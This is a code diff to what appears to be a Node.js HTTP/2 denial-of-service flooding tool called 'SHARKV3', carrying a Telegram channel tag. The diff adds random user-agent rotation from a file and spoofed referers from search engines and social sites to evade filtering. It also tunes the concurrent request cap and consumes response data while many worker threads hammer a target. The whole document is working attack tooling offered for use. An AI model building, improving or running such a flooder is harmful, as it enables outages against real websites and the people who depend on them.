@@ -3,11 +3,25 @@ const { Worker, isMainThread, workerData } = require('worker_threads');
 const { cpus } = require('os');
 const readline = require('readline');
 const net = require('net');
+const fs = require('fs');
+
+// Load user agents from ua.txt
+const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);
+
+// Rotate referers to avoid bad sources
+const referers = [
+    'https://www.google.com/',
+    'https://www.bing.com/',
+    'https://www.yahoo.com/',
+    'https://duckduckgo.com/',
+    'https://www.facebook.com/',
+    'https://www.reddit.com/',
+];
 
 const THREADS = 32;
 const INITIAL_CONNECTIONS = 45;
 const POWER_MULTIPLIER = 4;
-const MAX_INFLIGHT = 10000;
+const MAX_INFLIGHT = 4000;
 const LIVE_REFRESH_RATE = 1100;
 
 let totalRequests = 0;
@@ -27,9 +41,8 @@ if (isMainThread) {
 
     console.clear();
     console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
-    console.log(`SHARKV3! - NO THREAD WARMUP .exx`);
+    console.log(`SHARKV3! - NO CPU WARMUP .exx`);
 
-    
     for (let i = 0; i < THREADS; i++) {
         new Worker(__filename, { workerData: { target, duration, initial: true } });
     }
@@ -80,8 +93,16 @@ if (isMainThread) {
         if (inflight.count < MAX_INFLIGHT) {
             try {
                 inflight.count++;
-                const req = client.request({ ':method': 'GET', ':path': '/' });
+                const headers = {
+                    ':method': 'GET',
+                    ':path': '/',
+                    'user-agent': userAgents[Math.floor(Math.random() * userAgents.length)],
+                    'referer': referers[Math.floor(Math.random() * referers.length)]
+                };
+                const req = client.request(headers);
 
+                req.setEncoding('utf8');
+                req.on('data', () => {}); // consume data to ensure request completion
                 req.on('response', () => {
                     inflight.count--;
                     sendStat('ok');
